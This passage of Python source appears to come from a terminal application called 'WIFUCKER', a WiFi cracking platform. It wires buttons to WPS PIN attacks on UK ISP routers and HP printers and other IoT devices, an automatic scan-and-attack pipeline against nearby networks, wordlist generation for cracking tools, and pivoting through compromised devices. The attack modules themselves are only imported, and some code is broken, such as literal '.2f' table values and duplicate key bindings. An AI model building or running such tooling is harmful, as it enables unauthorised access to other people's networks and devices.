        self._launch_provider_attack("virgin_media")

    @on(Button.Pressed, "#bt_attack")
    def bt_attack(self, event):
        """Launch BT specific attack"""
        self._launch_provider_attack("bt")

    @on(Button.Pressed, "#ee_attack")
    def ee_attack(self, event):
        """Launch EE specific attack"""
        self._launch_provider_attack("ee")

    @on(Button.Pressed, "#auto_uk_attack")
    def auto_uk_attack(self, event):
        """Launch automatic UK provider attack"""
        log = self.query_one("#uk_wps_log", MarkupLog)
        ssid_input = self.query_one("#ssid_input", Input)

        ssid = ssid_input.value.strip()
        if not ssid:
            log.write("[red]❌ Please enter router SSID for auto-detection[/]")
            return

        # Detect provider
        try:
            from .crackers.router_cracker import RouterPasswordGenerator
            provider = RouterPasswordGenerator.detect_uk_provider(ssid)

            if provider:
                log.write(f"[cyan]🎯 Auto-detected provider: {provider.replace('_', ' ').title()}[/]")
                self._launch_provider_attack(provider)
            else:
                log.write("[yellow]⚠️ Could not auto-detect provider[/]")
                log.write("[cyan]💡 Try manual provider selection or check SSID format[/]")

        except Exception as e:
            log.write(f"[red]❌ Auto-detection failed: {e}[/]")

    def _launch_provider_attack(self, provider: str):
        """Launch provider-specific attack"""
        log = self.query_one("#uk_wps_log", MarkupLog)
        ssid_input = self.query_one("#ssid_input", Input)
        mac_input = self.query_one("#mac_input", Input)

        ssid = ssid_input.value.strip()
        mac = mac_input.value.strip()

        log.write(f"[cyan]🇬🇧 Launching {provider.replace('_', ' ').title()} specific attack[/]")

        try:
            from .crackers.router_cracker import RouterBruteForceCracker

            cracker = RouterBruteForceCracker(ssid)

            # Generate provider-specific wordlist
            wordlist = cracker.generate_uk_provider_wordlist(2000)

            log.write(f"[green]✓ Generated {len(wordlist):,} {provider.replace('_', ' ').title()} passwords[/]")

            # Save wordlist
            import os
            from pathlib import Path

            wordlist_file = Path.cwd() / f"uk_{provider}_wps_{ssid or 'unknown'}.txt"
            with open(wordlist_file, 'w') as f:
                f.write('\n'.join(wordlist))

            log.write(f"[green]✓ Saved wordlist: {wordlist_file}[/]")
            log.write("[cyan]💡 Use this wordlist with WiFi cracking tools[/]")

            # Update wordlist stats
            stats_display = self.query_one("#wordlist_stats", Static)
            stats_display.update(f"""
Wordlist: {provider.replace('_', ' ').title()} WPS Patterns
Passwords: {len(wordlist):,}
File: {wordlist_file.name}
Sample: {', '.join(wordlist[:5])}
            """.strip())

        except Exception as e:
            log.write(f"[red]❌ Provider attack failed: {e}[/]")

    @on(Button.Pressed, "#generate_wps_pins")
    def generate_wps_pins(self, event):
        """Generate WPS PIN wordlist"""
        log = self.query_one("#uk_wps_log", MarkupLog)
        ssid_input = self.query_one("#ssid_input", Input)
        mac_input = self.query_one("#mac_input", Input)
        count_input = self.query_one("#wps_count_input", Input)

        ssid = ssid_input.value.strip()
        mac = mac_input.value.strip()

        try:
            count = int(count_input.value.strip())
            count = max(100, min(5000, count))  # Clamp between 100-5000
        except ValueError:
            count = 1000

        log.write(f"[cyan]🔢 Generating {count:,} WPS PINs[/]")

        try:
            from .crackers.router_cracker import RouterBruteForceCracker

            cracker = RouterBruteForceCracker(ssid)
            pins = cracker.generate_wps_pins(mac, count)

            log.write(f"[green]✓ Generated {len(pins):,} WPS PINs[/]")

            # Store wordlist
            self._current_wordlist = pins

            # Update stats
            stats_display = self.query_one("#wordlist_stats", Static)
            stats_display.update(f"""
WPS PIN Wordlist
PINs: {len(pins):,}
Sample: {', '.join(pins[:10])}
Unique: {len(set(pins)):,}
            """.strip())

            log.write("[cyan]💡 Click 'Save Wordlist' to export for WiFi cracking[/]")

        except Exception as e:
            log.write(f"[red]❌ PIN generation failed: {e}[/]")

    @on(Button.Pressed, "#save_wps_wordlist")
    def save_wps_wordlist(self, event):
        """Save generated WPS wordlist to file"""
        log = self.query_one("#uk_wps_log", MarkupLog)

        if not self._current_wordlist:
            log.write("[red]❌ No wordlist generated yet[/]")
            log.write("[cyan]💡 Generate WPS PINs first[/]")
            return

        try:
            from pathlib import Path

            filepath = Path.cwd() / "wps_pins.txt"

            with open(filepath, 'w') as f:
                f.write('\n'.join(self._current_wordlist))

            log.write(f"[green]✓ WPS wordlist saved: {filepath} ({len(self._current_wordlist):,} PINs)[/]")
            log.write("[cyan]💡 Ready to use with WiFi cracking tools![/]")

        except Exception as e:
            log.write(f"[red]❌ Failed to save wordlist: {e}[/]")

    @on(Button.Pressed, "#small_dh_attack")
    def small_dh_attack(self, event):
        """Launch Small DH Key attack"""
        self._launch_advanced_attack("small_dh_key")

    @on(Button.Pressed, "#registrar_disclosure_attack")
    def registrar_disclosure_attack(self, event):
        """Launch Registrar PIN Disclosure attack"""
        self._launch_advanced_attack("registrar_pin_disclosure")

    @on(Button.Pressed, "#eap_injection_attack")
    def eap_injection_attack(self, event):
        """Launch EAP Message Injection attack"""
        self._launch_advanced_attack("eap_injection")

    @on(Button.Pressed, "#auto_advanced_attack")
    def auto_advanced_attack(self, event):
        """Launch all advanced attacks automatically"""
        log = self.query_one("#uk_wps_log", MarkupLog)
        ssid_input = self.query_one("#ssid_input", Input)
        mac_input = self.query_one("#mac_input", Input)

        ssid = ssid_input.value.strip()
        mac = mac_input.value.strip()

        if not ssid:
            log.write("[red]❌ Please enter router SSID[/]")
            return

        log.write("[red]🚀 LAUNCHING ALL ADVANCED WPS ATTACKS[/]")
        log.write(f"[cyan]Target: {ssid} ({mac or 'MAC unknown'})[/]")
        log.write("")

        # Try all advanced attacks
        advanced_methods = ["small_dh_key", "registrar_pin_disclosure", "eap_injection"]

        for method in advanced_methods:
            log.write(f"[yellow]Trying {method.replace('_', ' ').title()}...[/]")
            result = self._launch_single_advanced_attack(method, mac, ssid)

            if result and result.success:
                log.write(f"[green]✅ SUCCESS! PIN: {result.pin} using {method}[/]")
                # Update results table
                table = self.query_one("#wps_results_table", DataTable)
                table.add_row(
                    method.replace('_', ' ').title(),
                    result.pin,
                    "✅ SUCCESS",
                    result.router_model or "Unknown",
                    ".2f"
                )
                return  # Stop on first success

            log.write(f"[red]❌ {method.replace('_', ' ').title()} failed[/]")

        log.write("[yellow]⚠️ All advanced attacks failed[/]")
        log.write("[cyan]💡 Try basic WPS methods or check router compatibility[/]")

    def _launch_advanced_attack(self, method: str):
        """Launch a specific advanced attack"""
        log = self.query_one("#uk_wps_log", MarkupLog)
        ssid_input = self.query_one("#ssid_input", Input)
        mac_input = self.query_one("#mac_input", Input)

        ssid = ssid_input.value.strip()
        mac = mac_input.value.strip()

        if not ssid:
            log.write("[red]❌ Please enter router SSID[/]")
            return

        log.write(f"[cyan]🎯 Launching {method.replace('_', ' ').title()} attack on: {ssid}[/]")

        result = self._launch_single_advanced_attack(method, mac, ssid)

        if result and result.success:
            log.write(f"[green]✅ SUCCESS! PIN: {result.pin}[/]")
            log.write(f"[cyan]🎯 Method: {method.replace('_', ' ').title()}[/]")
            log.write(f"[cyan]⏱️  Time: {result.execution_time:.2f}s[/]")
            if result.router_model:
                log.write(f"[cyan]📱 Router: {result.router_model}[/]")

            # Add to results table
            table = self.query_one("#wps_results_table", DataTable)
            table.add_row(
                method.replace('_', ' ').title(),
                result.pin,
                "✅ SUCCESS",
                result.router_model or "Unknown",
                ".2f"
            )
        else:
            log.write("[yellow]⚠️ Advanced attack completed - no PIN found[/]")
            log.write("[cyan]💡 Try different attack method or check router[/]")

    def _launch_single_advanced_attack(self, method: str, mac: str, ssid: str):
        """Launch a single advanced attack and return result"""
        try:
            from .crackers.advanced_wps_attacks import (
                SmallDHKeyAttack,
                WPSRegistrarPinDisclosure,
                EAPEAPMessageInjection
            )

            attack_map = {
                "small_dh_key": SmallDHKeyAttack,
                "registrar_pin_disclosure": WPSRegistrarPinDisclosure,
                "eap_injection": EAPEAPMessageInjection
            }

            if method in attack_map:
                attacker = attack_map[method](mac or "00:11:22:33:44:55", ssid)
                return attacker.execute_attack(timeout=60)

        except ImportError:
            pass
        except Exception as e:
            print(f"Advanced attack {method} error: {e}")

        return None

    @on(Button.Pressed, "#full_pipeline_attack")
    def full_pipeline_attack(self, event):
        """Launch full WPS attack pipeline: scan → identify → attack → verify"""
        log = self.query_one("#uk_wps_log", MarkupLog)
        interface_input = self.query_one("#interface_input", Input)

        interface = interface_input.value.strip() or "wlan0"

        log.write("[red]🚀 LAUNCHING COMPLETE WPS ATTACK PIPELINE[/]")
        log.write(f"[cyan]Interface: {interface}[/]")
        log.write("[yellow]This will scan for vulnerable routers and attack them automatically[/]")
        log.write("[yellow]⚠️  Ensure you have permission to test these networks[/]")
        log.write("")

        # Run pipeline in background thread to avoid blocking UI
        import threading
        pipeline_thread = threading.Thread(
            target=self._run_pipeline_background,
            args=(interface,),
            daemon=True
        )
        pipeline_thread.start()

    def _run_pipeline_background(self, interface: str):
        """Run the full pipeline in background thread"""
        log = self.query_one("#uk_wps_log", MarkupLog)

        try:
            from .crackers.uk_router_wps import WPSAttackPipeline

            # Create pipeline
            pipeline = WPSAttackPipeline(interface)

            # Run full pipeline
            results = pipeline.run_full_pipeline(
                interface=interface,
                scan_timeout=30,
                attack_timeout=60
            )

            # Update UI with results
            self._update_pipeline_results(results)

        except ImportError:
            log.write("[red]❌ WPS pipeline module not available[/]")
        except Exception as e:
            log.write(f"[red]❌ Pipeline execution failed: {e}[/]")

    def _update_pipeline_results(self, results: Dict):
        """Update UI with pipeline results"""
        log = self.query_one("#uk_wps_log", MarkupLog)

        pipeline_results = results.get("pipeline_results", {})
        discovered = results.get("discovered_routers", [])
        attacks = results.get("attack_results", {})

        log.write("")
        log.write("[green]🎯 PIPELINE COMPLETED[/]")
        log.write("[cyan]Results Summary:[/]")
        log.write(f"[cyan]  • Routers discovered: {pipeline_results.get('routers_discovered', 0)}[/]")
        log.write(f"[cyan]  • Successful attacks: {pipeline_results.get('successful_attacks', 0)}[/]")
        log.write(f"[cyan]  • Success rate: {pipeline_results.get('success_rate', 0):.1%}[/]")
        log.write("")
        log.write("[cyan]Discovered Routers:[/]")

        for i, router in enumerate(discovered, 1):
            ssid = router.get('ssid', 'Unknown')
            bssid = router.get('bssid', 'Unknown')
            channel = router.get('channel', 0)
            locked = "🔒 Locked" if router.get('wps_locked', False) else "🔓 Open"

            log.write(f"[yellow]  {i}. {ssid} ({bssid}) - Ch:{channel} {locked}[/]")

        log.write("")
        log.write("[cyan]Successful Attacks:[/]")

        successful_results = {k: v for k, v in attacks.items() if k != "summary" and v}
        if successful_results:
            for bssid, result in successful_results.items():
                log.write(f"[green]  ✅ {bssid}: PIN {result['pin']} ({result['method']})[/]")

            # Update results table
            table = self.query_one("#wps_results_table", DataTable)
            for bssid, result in successful_results.items():
                table.add_row(
                    result['method'],
                    result['pin'],
                    "✅ SUCCESS",
                    result.get('router_model', 'Unknown'),
                    ".2f"
                )
        else:
            log.write("[yellow]  No successful attacks[/]")

        log.write("")
        log.write("[cyan]💡 Pipeline completed. Check results table for details.[/]")

        # Store results for report generation
        self._pipeline_results = results

    @on(Button.Pressed, "#pipeline_report")
    def generate_pipeline_report(self, event):
        """Generate comprehensive pipeline report"""
        log = self.query_one("#uk_wps_log", MarkupLog)

        if not hasattr(self, '_pipeline_results'):
            log.write("[red]❌ No pipeline results available[/]")
            log.write("[cyan]💡 Run the full pipeline attack first[/]")
            return

        try:
            import json
            from pathlib import Path

            # Generate report
            results = self._pipeline_results
            report = results.get("report", {})

            # Create detailed report
            detailed_report = {
                "pipeline_execution": results.get("pipeline_results", {}),
                "scan_summary": report.get("scan_summary", {}),
                "attack_results": report.get("attack_results", {}),
                "vulnerability_summary": report.get("vulnerability_summary", {}),
                "discovered_routers": results.get("discovered_routers", []),
                "timestamp": "2025-12-23",  # Current date
                "interface": "wlan0"
            }

            # Save JSON report
            report_file = Path.cwd() / "wps_pipeline_report.json"
            with open(report_file, 'w') as f:
                json.dump(detailed_report, f, indent=2)

            log.write(f"[green]✅ Pipeline report saved: {report_file}[/]")

            # Display summary
            scan_summary = report.get("scan_summary", {})
            attack_summary = report.get("attack_results", {}).get("summary", {})

            log.write("")
            log.write("[cyan]📊 Report Summary:[/]")
            log.write(f"[cyan]  • Total routers discovered: {scan_summary.get('total_routers_discovered', 0)}[/]")
            log.write(f"[cyan]  • WPS-enabled routers: {scan_summary.get('wps_enabled_routers', 0)}[/]")
            log.write(f"[cyan]  • Total attacks attempted: {attack_summary.get('total_attacks', 0)}[/]")
            log.write(f"[cyan]  • Successful attacks: {attack_summary.get('successful_attacks', 0)}[/]")

            providers = scan_summary.get("routers_by_provider", {})
            if providers:
                log.write("[cyan]  • Routers by provider:[/]")
                for provider, count in providers.items():
                    log.write(f"[yellow]    - {provider}: {count}[/]")

            vulns = report.get("vulnerability_summary", {})
            if vulns.get("potentially_vulnerable_models"):
                log.write(f"[cyan]  • Potentially vulnerable models: {vulns.get('total_vulnerable_models', 0)}[/]")

        except Exception as e:
            log.write(f"[red]❌ Report generation failed: {e}[/]")


class IoTWPSTab(Container):
    """IoT Device WPS Attack Interface - HP Printers & IoT Devices"""

    def __init__(self):
        super().__init__(id="iot_wps_container")
        self.iot_devices = []
        self.selected_device = None
        self.attack_results = {}
        self.pivot_manager = None

    def compose(self):
        """Compose the IoT WPS attack interface"""
        yield Label("[bold white]IoT WPS Attacks[/]")
        yield Label("[cyan]Target IoT devices (HP printers, smart TVs, cameras) for WPS exploitation[/]")
        yield Label("[dim]💡 Scan → Select Device → Attack WPS → Pivot for Router Access[/]")

        # Help text
        yield Label("[yellow]⚠️  IoT devices may have weak WPS implementations[/]")
        yield Label("[yellow]🎯 Focus: HP Envy printers, OfficeJet, LaserJet series[/]")

        with Vertical():
            # Device Scanning Section
            yield Label("[yellow]🔍 IoT Device Discovery:[/]")

            with Horizontal():
                yield Input(placeholder="wlan0", value="wlan0",
                           id="iot_interface", classes="input-field")
                yield Button("🔍 Scan IoT Devices", id="scan_iot_devices", variant="primary")
                yield Button("📋 List Detected", id="list_iot_devices", variant="secondary")

            # Device Selection
            yield Label("[cyan]Detected IoT Devices:[/]")
            yield DataTable(
                id="iot_device_table",
                zebra_stripes=True,
                header_height=1,
                classes="datatable"
            )

            # Device Details
            yield Label("[cyan]Selected Device Details:[/]")
            with ScrollableContainer(height=8, classes="preview-container"):
                yield Static("", id="iot_device_details", classes="details-panel")

            # WPS Attack Section
            yield Label("[yellow]🎯 WPS Attack Methods:[/]")

            with Horizontal():
                yield Button("🔐 Default PIN Attack", id="iot_default_pin", variant="error",
                           tooltip="Try manufacturer default WPS PINs")
                yield Button("📡 MAC-Based Attack", id="iot_mac_based", variant="warning",
                           tooltip="Generate PINs from device MAC address")
                yield Button("🧮 Computed PIN Attack", id="iot_computed_pin", variant="success",
                           tooltip="Use known PIN computation algorithms")
                yield Button("💪 Brute Force", id="iot_brute_force", variant="error",
                           tooltip="Systematic PIN testing (may take time)")

            # Advanced Attack Options
            with Horizontal():
                yield Button("✨ Pixie Dust Attack", id="iot_pixie_dust", variant="primary",
                           tooltip="Offline PIN extraction using nonces")
                yield Button("🔬 Small DH Key", id="iot_small_dh", variant="warning",
                           tooltip="Exploit weak Diffie-Hellman parameters")

            # Pivot Section
            yield Label("[yellow]🌐 Network Pivot & Relay:[/]")

            with Horizontal():
                yield Button("🔗 Setup Pivot", id="setup_pivot", variant="success",
                           tooltip="Use compromised IoT device as network relay")
                yield Button("🌍 Test Internet Access", id="test_pivot", variant="primary",
                           tooltip="Verify pivot provides internet connectivity")
                yield Button("🧹 Cleanup Pivot", id="cleanup_pivot", variant="warning",
                           tooltip="Remove pivot routing and disconnect")

            # Results Section
            yield Label("[cyan]Attack Results & Pivot Status:[/]")
            yield MarkupLog(id="iot_wps_log", wrap=True, markup=True, classes="log-panel")

            # Progress Monitor
            yield ProgressMonitor(id="iot_progress")

    @on(Button.Pressed, "#scan_iot_devices")
    def scan_iot_devices(self, event):
        """Scan for IoT devices on the network"""
        log = self.query_one("#iot_wps_log", MarkupLog)
        monitor = self.query_one("#iot_progress", ProgressMonitor)
        interface_input = self.query_one("#iot_interface", Input)

        interface = interface_input.value.strip()
        if not interface:
            log.write("[red]❌ Please specify wireless interface[/]")
            return

        log.write("[cyan]🔍 Scanning for IoT devices...[/]")
        monitor.set_status("Scanning for IoT devices...")

        def scan_worker():
            try:
                from .crackers.iot_wps_cracker import IoTWPSCracker

                cracker = IoTWPSCracker(interface)
                self.iot_devices = cracker.scan_and_detect_iot_devices(duration=15)

                self.app.call_from_thread(self._update_device_table)

                if self.iot_devices:
                    log.write(f"[green]✅ Found {len(self.iot_devices)} IoT device(s)[/]")
                    monitor.set_status(f"Found {len(self.iot_devices)} IoT devices")
                else:
                    log.write("[yellow]⚠️ No IoT devices detected[/]")
                    monitor.set_status("No IoT devices found")

            except Exception as e:
                log.write(f"[red]❌ Scan failed: {e}[/]")
                monitor.set_status("Scan failed")

        threading.Thread(target=scan_worker, daemon=True).start()

    def _update_device_table(self):
        """Update the device table with scan results"""
        table = self.query_one("#iot_device_table", DataTable)

        # Clear existing data
        table.clear()

        # Set headers
        table.add_columns("Type", "SSID", "MAC", "Vendor", "Vulnerable")

        # Add device data
        for device in self.iot_devices:
            vuln_status = "✅ Yes" if device.wps_enabled else "❌ No"
            table.add_row(
                device.device_type.value.replace("_", " ").title(),
                device.ssid,
                device.mac_address or "Unknown",
                device.vendor,
                vuln_status
            )

    @on(DataTable.RowSelected, "#iot_device_table")
    def on_device_selected(self, event):
        """Handle device selection"""
        if event.row_index < len(self.iot_devices):
            self.selected_device = self.iot_devices[event.row_index]
            self._update_device_details()

    def _update_device_details(self):
        """Update device details panel"""
        details_panel = self.query_one("#iot_device_details", Static)

        if not self.selected_device:
            details_panel.update("")
            return

        device = self.selected_device
        details = f"""
[bold cyan]Device Information:[/bold cyan]
• Type: {device.device_type.value.replace('_', ' ').title()}
• SSID: {device.ssid}
• MAC: {device.mac_address or 'Unknown'}
• Vendor: {device.vendor}
• Model: {device.model or 'Unknown'}
• WPS Enabled: {'✅ Yes' if device.wps_enabled else '❌ No'}

[bold cyan]Vulnerabilities:[/bold cyan]
"""

        if device.vulnerabilities:
            for vuln in device.vulnerabilities:
                details += f"• {vuln.replace('_', ' ').title()}\n"
        else:
            details += "• None detected\n"

        if hasattr(device, 'default_pins') and device.default_pins:
            details += f"\n[bold cyan]Known Default PINs:[/bold cyan]\n"
            for pin in device.default_pins[:5]:  # Show first 5
                details += f"• {pin}\n"
            if len(device.default_pins) > 5:
                details += f"• ... and {len(device.default_pins) - 5} more\n"

        details_panel.update(details)

    def _launch_iot_wps_attack(self, method_name: str):
        """Launch IoT WPS attack with specified method"""
        if not self.selected_device:
            log = self.query_one("#iot_wps_log", MarkupLog)
            log.write("[red]❌ Please select an IoT device first[/]")
            return

        log = self.query_one("#iot_wps_log", MarkupLog)
        monitor = self.query_one("#iot_progress", ProgressMonitor)

        device = self.selected_device

        # Map method names to enum values
        method_map = {
            "default_pin": "DEFAULT_PIN",
            "mac_based": "MAC_BASED",
            "computed_pin": "COMPUTE_PIN",
            "brute_force": "BRUTE_FORCE",
            "pixie_dust": "PIXIE_DUST",
            "small_dh": "SMALL_DH_KEY"
        }

        if method_name not in method_map:
            log.write(f"[red]❌ Unknown attack method: {method_name}[/]")
            return

        log.write(f"[cyan]🎯 Starting {method_name.replace('_', ' ').title()} attack on {device.ssid}[/]")
        monitor.set_status(f"Attacking {device.ssid}...")

        def attack_worker():
            try:
                from .crackers.iot_wps_cracker import IoTWPSCracker, WPSAttackMethod

                cracker = IoTWPSCracker()
                method = WPSAttackMethod[method_map[method_name]]

                if device.device_type.value == "hp_printer":
                    result = cracker.crack_hp_printer_wps(device, method)
                else:
                    # Generic IoT device attack (not implemented yet)
                    result = WPSAttackResult(
                        device=device,
                        method_used=method,
                        success=False,
                        error_message="Generic IoT attacks not yet implemented"
                    )

                self.attack_results[device.mac_address] = result

                self.app.call_from_thread(self._update_attack_results, result)

            except Exception as e:
                log.write(f"[red]❌ Attack failed: {e}[/]")
                monitor.set_status("Attack failed")

        threading.Thread(target=attack_worker, daemon=True).start()

    def _update_attack_results(self, result):
        """Update UI with attack results"""
        log = self.query_one("#iot_wps_log", MarkupLog)
        monitor = self.query_one("#iot_progress", ProgressMonitor)

        if result.success:
            log.write(f"[green]✅ SUCCESS! PIN found: {result.pin_found}[/]")
            log.write(f"[green]⏱️ Attack took {result.timing:.2f} seconds[/]")
            if result.network_key:
                log.write(f"[green]🔑 Network key: {result.network_key}[/]")
            monitor.set_status("WPS cracked successfully!")
        else:
            log.write(f"[red]❌ Attack failed: {result.error_message}[/]")
            monitor.set_status("Attack failed")

    @on(Button.Pressed, "#iot_default_pin")
    def on_default_pin_attack(self, event):
        self._launch_iot_wps_attack("default_pin")

    @on(Button.Pressed, "#iot_mac_based")
    def on_mac_based_attack(self, event):
        self._launch_iot_wps_attack("mac_based")

    @on(Button.Pressed, "#iot_computed_pin")
    def on_computed_pin_attack(self, event):
        self._launch_iot_wps_attack("computed_pin")

    @on(Button.Pressed, "#iot_brute_force")
    def on_brute_force_attack(self, event):
        self._launch_iot_wps_attack("brute_force")

    @on(Button.Pressed, "#iot_pixie_dust")
    def on_pixie_dust_attack(self, event):
        self._launch_iot_wps_attack("pixie_dust")

    @on(Button.Pressed, "#iot_small_dh")
    def on_small_dh_attack(self, event):
        self._launch_iot_wps_attack("small_dh")

    @on(Button.Pressed, "#setup_pivot")
    def setup_pivot(self, event):
        """Set up network pivot through compromised IoT device"""
        if not self.selected_device:
            log = self.query_one("#iot_wps_log", MarkupLog)
            log.write("[red]❌ Please select a compromised IoT device first[/]")
            return

        device_mac = self.selected_device.mac_address
        if device_mac not in self.attack_results:
            log = self.query_one("#iot_wps_log", MarkupLog)
            log.write("[red]❌ No successful attack on selected device[/]")
            return

        attack_result = self.attack_results[device_mac]
        if not attack_result.success:
            log = self.query_one("#iot_wps_log", MarkupLog)
            log.write("[red]❌ Attack was not successful on this device[/]")
            return

        log = self.query_one("#iot_wps_log", MarkupLog)
        monitor = self.query_one("#iot_progress", ProgressMonitor)

        log.write(f"[cyan]🔗 Setting up network pivot through {self.selected_device.ssid}[/]")
        monitor.set_status("Setting up network pivot...")

        def pivot_worker():
            try:
                from .crackers.iot_wps_cracker import IoTDevicePivot

                if not self.pivot_manager:
                    self.pivot_manager = IoTDevicePivot()

                success = self.pivot_manager.setup_pivot(self.selected_device, attack_result)

                if success:
                    self.app.call_from_thread(self._pivot_success)
                else:
                    self.app.call_from_thread(self._pivot_failed)

            except Exception as e:
                self.app.call_from_thread(self._pivot_error, str(e))

        threading.Thread(target=pivot_worker, daemon=True).start()

    def _pivot_success(self):
        """Handle successful pivot setup"""
        log = self.query_one("#iot_wps_log", MarkupLog)
        monitor = self.query_one("#iot_progress", ProgressMonitor)

        log.write("[green]✅ Network pivot established successfully![/]")
        log.write("[green]🌐 IoT device is now routing traffic to the internet[/]")
        monitor.set_status("Pivot active - internet accessible")

    def _pivot_failed(self):
        """Handle pivot setup failure"""
        log = self.query_one("#iot_wps_log", MarkupLog)
        monitor = self.query_one("#iot_progress", ProgressMonitor)

        log.write("[red]❌ Failed to establish network pivot[/]")
        monitor.set_status("Pivot setup failed")

    def _pivot_error(self, error_msg: str):
        """Handle pivot setup error"""
        log = self.query_one("#iot_wps_log", MarkupLog)
        monitor = self.query_one("#iot_progress", ProgressMonitor)

        log.write(f"[red]❌ Pivot error: {error_msg}[/]")
        monitor.set_status("Pivot error")

    @on(Button.Pressed, "#test_pivot")
    def test_pivot_connectivity(self, event):
        """Test if pivot provides internet access"""
        if not self.pivot_manager:
            log = self.query_one("#iot_wps_log", MarkupLog)
            log.write("[red]❌ No active pivot to test[/]")
            return

        log = self.query_one("#iot_wps_log", MarkupLog)
        monitor = self.query_one("#iot_progress", ProgressMonitor)

        log.write("[cyan]🌍 Testing internet connectivity through pivot...[/]")
        monitor.set_status("Testing pivot connectivity...")

        def test_worker():
            try:
                # Simple connectivity test
                import subprocess
                result = subprocess.run(
                    ["ping", "-c", "1", "-W", "3", "8.8.8.8"],
                    capture_output=True,
                    timeout=5
                )

                if result.returncode == 0:
                    self.app.call_from_thread(self._test_success)
                else:
                    self.app.call_from_thread(self._test_failed)

            except Exception as e:
                self.app.call_from_thread(self._test_error, str(e))

        threading.Thread(target=test_worker, daemon=True).start()

    def _test_success(self):
        """Handle successful connectivity test"""
        log = self.query_one("#iot_wps_log", MarkupLog)
        monitor = self.query_one("#iot_progress", ProgressMonitor)

        log.write("[green]✅ Internet connectivity confirmed through IoT pivot![/]")
        log.write("[green]🚀 You can now access the router and internet via the compromised device[/]")
        monitor.set_status("Internet accessible via pivot")

    def _test_failed(self):
        """Handle failed connectivity test"""
        log = self.query_one("#iot_wps_log", MarkupLog)
        monitor = self.query_one("#iot_progress", ProgressMonitor)

        log.write("[red]❌ Internet connectivity test failed[/]")
        monitor.set_status("No internet access via pivot")

    def _test_error(self, error_msg: str):
        """Handle connectivity test error"""
        log = self.query_one("#iot_wps_log", MarkupLog)
        monitor = self.query_one("#iot_progress", ProgressMonitor)

        log.write(f"[red]❌ Connectivity test error: {error_msg}[/]")
        monitor.set_status("Connectivity test failed")

    @on(Button.Pressed, "#cleanup_pivot")
    def cleanup_pivot(self, event):
        """Clean up network pivot"""
        if not self.pivot_manager or not self.selected_device:
            log = self.query_one("#iot_wps_log", MarkupLog)
            log.write("[red]❌ No active pivot to clean up[/]")
            return

        device_mac = self.selected_device.mac_address
        log = self.query_one("#iot_wps_log", MarkupLog)
        monitor = self.query_one("#iot_progress", ProgressMonitor)

        log.write("[cyan]🧹 Cleaning up network pivot...[/]")
        monitor.set_status("Cleaning up pivot...")

        try:
            self.pivot_manager.cleanup_pivot(device_mac)
            log.write("[green]✅ Pivot cleaned up successfully[/]")
            monitor.set_status("Pivot cleaned up")
        except Exception as e:
            log.write(f"[red]❌ Cleanup failed: {e}[/]")
            monitor.set_status("Cleanup failed")

    @on(Button.Pressed, "#list_iot_devices")
    def list_iot_devices(self, event):
        """List all detected IoT devices"""
        log = self.query_one("#iot_wps_log", MarkupLog)

        if not self.iot_devices:
            log.write("[yellow]⚠️ No IoT devices detected. Run a scan first.[/]")
            return

        log.write(f"[cyan]📋 Detected {len(self.iot_devices)} IoT device(s):[/]")

        for i, device in enumerate(self.iot_devices, 1):
            vuln_indicator = "🎯" if device.wps_enabled else "❌"
            log.write(f"[cyan]{i}. {device.device_type.value.replace('_', ' ').title()}: {device.ssid} ({device.vendor}) {vuln_indicator}[/]")

        log.write("[dim]💡 Select a device from the table above to attack[/]")


class WiFuFuckerApp(App):
    """Unified WIFUCKER application - Simplified 2-Tab Design"""

    CSS = """
    Screen {
        background: $surface;
        color: $text;
    }

    Header {
        background: $primary;
        color: $text;
        height: 1;
    }

    Footer {
        background: $primary;
        color: $text;
        height: 1;
    }

    Button {
        margin: 0 1;
    }

    Button:hover {
        background: $accent;
    }

    Input {
        margin: 1 1;
        width: 1fr;
    }

    Log {
        margin: 1 1;
        height: 1fr;
        border: round $accent;
    }

    .status-indicator {
        margin: 0 1;
        padding: 0 1;
    }

    .progress-bar {
        width: 100%;
        height: 1;
    }

    .preview-container {
        height: 10;
        border: solid $accent;
        margin: 1 0;
        padding: 1;
    }

    .network-card {
        border: solid $accent;
        margin: 1 0;
        padding: 1;
        height: 15;  /* Make network list taller */
        min-height: 15;
    }
    """

    BINDINGS = [
        Binding("q", "quit", "Quit", show=True),
        Binding("c", "clear_log", "Clear Log", show=True),
        Binding("ctrl+s", "save_results", "Save Results", show=True),
        Binding("tab", "next_tab", "Next Tab", show=True),
        Binding("shift+tab", "prev_tab", "Prev Tab", show=True),
        Binding("f5", "refresh_data", "Refresh", show=True),
        Binding("up", "select_prev_network", "Prev Network", show=False),
        Binding("down", "select_next_network", "Next Network", show=False),
        Binding("enter", "confirm_network_selection", "Select Network", show=False),
    ]

    TITLE = "WIFUCKER - Unified Cracking Platform"
    SUB_TITLE = "WiFi Operations + Intelligence | Layer 9 (QUANTUM) Active"

    def on_mount(self) -> None:
        """Initialize with Layer 9 (QUANTUM) clearance on startup"""
        # Set Layer 9 clearance in background
        def set_clearance():
            try:
                import subprocess
                clearance_script = SCRIPTS_DIR / "set_max_clearance.py"
                if clearance_script.exists():
                    subprocess.run(
                        [PYTHON_BIN, str(clearance_script)],
                        capture_output=True,
                        timeout=5
                    )
            except Exception:
                pass  # Fail silently, clearance may already be set

        threading.Thread(target=set_clearance, daemon=True).start()

    def compose(self) -> ComposeResult:
        yield Header()
        with TabbedContent(id="tabs"):
            with TabPane("WiFi Operations", id="wifi_tab"):
                yield WiFiOperationsTab()
            with TabPane("Router Cracking", id="router_tab"):
                yield RouterCrackingTab()
            with TabPane("UK Router WPS", id="uk_wps_tab"):
                yield UKRouterWPSTab()
            with TabPane("IoT WPS Attacks", id="iot_wps_tab"):
                yield IoTWPSTab()
            with TabPane("Evil Twin Suite", id="evil_twin_tab"):
                yield EvilTwinSuiteTab()
            with TabPane("Intelligence & Tools", id="intel_tab"):
                yield IntelligenceToolsTab()
        yield Footer()

    BINDINGS = [
        ("q", "quit", "Quit application"),
        ("c", "clear_log", "Clear current tab log"),
        ("s", "save_results", "Save results to file"),
        ("r", "refresh_data", "Refresh current tab data"),
        ("left", "prev_tab", "Previous tab"),
        ("right", "next_tab", "Next tab"),
        ("?", "show_help", "Show help"),
    ]

    def action_show_help(self) -> None:
        """Show help dialog with keyboard shortcuts"""
        help_text = """
[bold blue]WIFUCKER Keyboard Shortcuts:[/bold blue]

[green]Navigation:[/green]
  ← →     Switch between tabs
  ↑ ↓     Navigate network list (WiFi tab)
  Enter   Select network (WiFi tab)
  q       Quit application

[green]Actions:[/green]
  c       Clear current tab log
  s       Save results to file
  r       Refresh current tab data
  ?       Show this help

[green]WiFi Operations Tab:[/green]
